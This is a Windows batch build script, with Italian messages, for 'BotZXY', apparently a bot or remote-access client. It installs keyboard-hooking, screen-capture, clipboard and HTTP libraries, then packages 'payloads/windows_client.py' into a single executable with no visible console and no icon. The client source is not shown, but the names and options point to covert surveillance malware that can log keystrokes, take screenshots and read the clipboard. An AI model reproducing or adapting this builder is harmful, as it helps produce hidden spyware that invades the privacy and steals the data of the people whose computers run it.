@echo off
echo ========================================
echo   BotZXY - Windows Client Builder v2.0
echo ========================================
echo.

REM Verifica Python
py -3.11 --version >nul 2>&1
if errorlevel 1 (
    echo [ERRORE] Python 3.11 non trovato!
    echo Installa Python 3.11 da python.org
    pause
    exit /b 1
)

echo [1] Installazione dipendenze...
py -3.11 -m pip install pyinstaller pyautogui opencv-python pillow requests keyboard pywin32

echo.
echo [2] Compilazione EXE...
py -3.11 -m PyInstaller --onefile --noconsole --name botzxy_client --icon=NUL --add-data "payloads/windows_client.py;." --hidden-import keyboard --hidden-import pyautogui --hidden-import win32clipboard payloads/windows_client.py

echo.
echo ========================================
echo   Build completato!
echo   File: dist\botzxy_client.exe
echo   Dimensione: 
dir dist\botzxy_client.exe 2>nul || echo File non trovato
echo ========================================
pause